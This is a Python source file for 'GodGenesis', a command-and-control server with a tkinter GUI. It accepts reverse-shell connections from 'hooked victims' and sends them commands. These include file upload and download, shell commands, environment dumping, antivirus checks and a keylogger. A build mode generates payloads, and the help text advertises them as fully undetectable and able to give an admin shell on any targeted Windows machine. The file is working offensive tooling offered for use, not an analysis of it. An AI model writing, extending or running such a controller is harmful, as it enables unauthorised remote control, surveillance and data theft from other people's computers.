import tkinter as tk
import tkinter as ttk
from tkinter import ttk
from tkinter import *
from tkinter.messagebox import showinfo
from pynput.keyboard import Key, Controller
import time

import os
import json
import socket
import getpass
import readline
import argparse
import threading
import subprocess
from assets.banner import banner
from assets.payload_builder import build_payload
from assets.helper import main_help, shell_help, session_help

keyboard = Controller()

def popup_options(event):
    my_menu.tk_popup(event.x_root, event.y_root)

def interact():
    item = trv.selection()[0]
    num = (trv.item(item)['values'][0]) #prints the session id
    targets_num = targets[num]
    targets_ip = ips[num]
    shell(targets_num, targets_ip)

def completer(text, state):
    options = [i for i in commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)


def sendtoall(target,data):
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())


def server():
    while True:
        if stop_threads:
            break
        connection_to_victim.settimeout(1)
        try:
            target, ip = connection_to_victim.accept()
            targets.append(target)
            ips.append(ip)
            print(str(ip) + " Has Connected To GOD GENESIS." )
            keyboard.press(Key.enter) #stimulate the Enter key pressed
        except:
            pass


def shell(target, ip):
    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode())


    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


    def download_file(file_name):
        f = open(file_name, 'wb')
    #target.settimeout(1)
        while True:
            chunk = target.recv(1024)
            if chunk.endswith('DONE'.encode()):
                f.write(chunk[:-4])
                f.close()
                break
            f.write(chunk)
        

    def upload_file(file_name):
        f = open(file_name, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            target.send(packet)
            packet = f.read(1024)
        target.send('DONE'.encode())


    while True:
    #edit here
        #waiting for the Run button to be pressed
        interact_button.wait_variable(var)
        #continue executing
        var.set(0)

        command = interact_entry.get()
        reliable_send(command)
        if command == 'terminate':
            target.close()
            targets.remove(target)
            ips.remove(target)
            break

        elif command == 'exit':
            break
            
        elif command == 'clear':
            os.system('clear')
        
        elif command[:3] == 'cd ':
            files = reliable_recv()
            print("Current Directory: ",files)
            command_output.insert(tk.END, "[+] Current directory: " + files)
            pass
    
        elif command[:3] == 'pwd':
            files = reliable_recv()
            print("You are now at: ", files)
            command_output.insert(tk.END, "[+] Current directory: " + files)

        elif command[:9] == 'download ':
            download_file(command[9:])
            command_output.insert(tk.END, "[+] File downloaded: " + command[9:])

        elif command[:7] == 'upload ':
            upload_file(command[7:])
            command_output.insert(tk.END, "[+] File uploaded: " + command[7:])

        elif command == 'user':
            detail = reliable_recv()
            print("The User Name Is : ",detail)
            command_output.insert(tk.END, "[+] The User Name Is: " + detail)
        
        elif command == 'info':
            result = reliable_recv()
            print(result)
            command_output.insert(tk.END, result)
            

        elif command == 'sc':
            result = reliable_recv()
            print(result)
            command_output.insert(tk.END, result)

        elif command == 'start':
            pass

        elif command == 'env':
            env_var = reliable_recv()
            print(env_var)
            command_output.insert(tk.END, env_var)

        elif command == 'av':
            result=reliable_recv()
            print(result)
            command_output.insert(tk.END, result)

        elif command == 'python3_install':
            pass     

        elif command == 'keylogger':
            print("keylogger started...")
            command_output.insert(tk.END, "[+] keylogger started...")
            continue
        elif command == "help":
            main_help()
        else:
            result = reliable_recv()
            print(result)
            
    
"""
Creating and parsing arguments
-i/--ip for specifying attacker's  ip.
-p/--port for specifying port on attackers machine, where the connection will be established
"""                
def create_parser():
    parser = argparse.ArgumentParser("GodGenesis — Fʀᴏᴍ Tʜᴇ Hᴏᴜsᴇ Oғ IEM(BCA) Mᴀᴅᴇ Bʏ Tᴇᴀᴍ BCAN 420", epilog="God Genesis is a C2 server purely coded in Python3 created to help Red Teamers and Penetration Testers. Currently It only supports TCP reverse shell but wait a min, its a FUD and can give u admin shell from any targeted WINDOWS Machine.")
    parser.add_argument("mode", help="options:  [build, listen]", choices=["build", "listen"])
    parser.add_argument("-i", "--ip",help="ip")
    parser.add_argument("-p", "--port", type=int, help="port")
    parser.add_argument("-o", "--outfile", help="specify a name for the built payload")
    return parser
      

parser = create_parser()
args = parser.parse_args()

print(banner())
if __name__ == "__main__":
    if args.mode == "build":
        build_payload(args)
    elif args.mode == "listen":
        root = tk.Tk()
        root.title('GodGenesis C2')
        root.geometry('820x600')
        
        var = tk.IntVar()

        my_menu = Menu(root, tearoff=False)
        my_menu.add_command(label="Interact", command=interact)
        
        wrapper_server = LabelFrame(root, text="Server information")
        wrapper_server.grid(row=0, column=0)

        wrapper1 = LabelFrame(root, text="Hooked Victims")
        wrapper1.grid(row=1, column=0)
        
        wrapper_command = LabelFrame(root, text="Command")
        wrapper_command.grid(row=2, column=0)

        wrapper_output = LabelFrame(root, text="Output")
        wrapper_output.grid(row=3, column=0)

        wrapper_interact = LabelFrame(root, text="Interact")
        wrapper_interact.grid(row=4, column=0)
        
        # add server information
        server_ip_label = tk.Label(wrapper_server, text="Server IP: ")
        server_ip_label.grid(row=0, column=0)
        
        server_ip_entry = tk.Entry(wrapper_server, width=50)
        server_ip_entry.grid(row=0, column=1)
        server_ip_entry.insert(0, args.ip)
        server_ip_entry.config(state= "disabled")
        
        port_ip_label = tk.Label(wrapper_server, text="Server Port: ")
        port_ip_label.grid(row=1, column=0)
        
        port_ip_entry = tk.Entry(wrapper_server, width=50)
        port_ip_entry.grid(row=1, column=1)
        port_ip_entry.insert(0, args.port)
        port_ip_entry.config(state= "disabled")

        #add victim interaction
        command_output = Text(wrapper_output, height = 5, width = 52)
        command_output.grid(row=0, column=0)

        interact_label = tk.Label(wrapper_interact, text="C2 >>")
        interact_label.grid(row=1, column=0)

        interact_entry = tk.Entry(wrapper_interact, width=50)
        interact_entry.grid(row=1, column=1)

        interact_button = tk.Button(wrapper_interact, text="Run", command=lambda: var.set(1))
        interact_button.grid(row=1, column=2)
        

        # define columns
        trv = ttk.Treeview(wrapper1, columns=(1, 2))
        trv['show'] = 'headings'
        trv.grid(row=0, column=2)

        # adding a treeview to look at real-time hooked users
        trv.heading(1, text="Session ID")
        trv.column(1, width=150)
        trv.heading(2, text="IP Address")
        trv.column(2, width=230)


        # add a vertical scrollbar inside the treeview
        scrollbar1 = tk.Scrollbar(wrapper1, command=trv.yview)
        trv.config(yscrollcommand=scrollbar1.set)
        scrollbar1.grid(row=0, column=1, sticky=NSEW)   
    
    
    
    
        ips = []
        targets = []
        stop_threads = False
        connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection_to_victim.bind((args.ip, args.port))
        connection_to_victim.listen(10)
        t1 = threading.Thread(target=server)
        t1.start()
        
        print(f"[+] Listening for incoming connections...\n")
        while True:
            for i in trv.get_children():
                trv.delete(i)
        
            session_id = 0
            for x in ips:
                trv.insert("", 0, tags="Low_value_target", values=(str(session_id), str(x)))
                session_id = session_id + 1
            trv.bind("<Button-3>", popup_options)
        
            command = input(f"┌──({getpass.getuser()}@GodGenesis-C2-Server)\n├──[~{os.getcwd()}]\n└╼ ")
            if command == "sessions -l":
                count = 0
                for ip in ips:
                    print("Session " + str(count) + " : " + str(ip))
                    count += 1
            elif command[:11] == "sessions -i":
                try:
                    num = int(command[12:])
                    targets_num = targets[num]
                    targets_ip = ips[num]
                    shell(targets_num, targets_ip)
                except:
                    print("GOD GENESIS doesn't recognize any session with that number")
                    
            elif command == 'clear':
                subprocess.run(['clear'], shell=False)
            elif command[:7] == 'sendall':
                x = len(targets)
                print(x)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        print(tarnumber)
                        sendtoall(tarnumber, command)
                        i += 1
                except Exception as e:
                    print(f'Failed: {e}')
                
            elif command == 'shell_help':
                print(targets)
            elif command == 'help':
                session_help()
            else:
                print(f"Command Not Found: {command}")
                
        tk.mainloop() 
    else:
        print("c2c.py: use '-h/--help' to show help message")
